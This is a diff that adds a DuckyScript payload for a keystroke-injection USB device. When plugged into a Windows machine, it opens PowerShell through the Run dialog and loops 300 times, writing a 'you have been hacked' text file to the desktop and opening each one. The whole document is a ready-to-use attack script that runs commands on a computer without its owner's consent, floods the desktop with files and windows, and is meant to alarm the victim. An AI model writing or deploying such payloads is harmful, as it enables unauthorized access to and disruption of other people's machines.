@@ -1,0 +1,20 @@
+REM Author: Waze
+REM Description: Creates a lot of files with the text you have been hacked on desktop.
+REM Version: 1.0
+
+DELAY 800
+GUI r
+DELAY 800
+STRING powershell
+ENTER
+DELAY 800
+STRING $DesktopPath = [Environment]::GetFolderPath("Desktop");
+ENTER
+DELAY 800
+STRING $asciiArt = "SORRY, BUT YOU HAVE BEEN HACKED"
+ENTER
+DELAY 800
+STRING for ($i=1; $i -le 300; $i++) { $fileName = "$DesktopPath\Hacked_$i.txt"; Set-Content -Path $fileName -Value $asciiArt; Start-Process -FilePath $fileName }
+ENTER
+DELAY 600
+GUI D
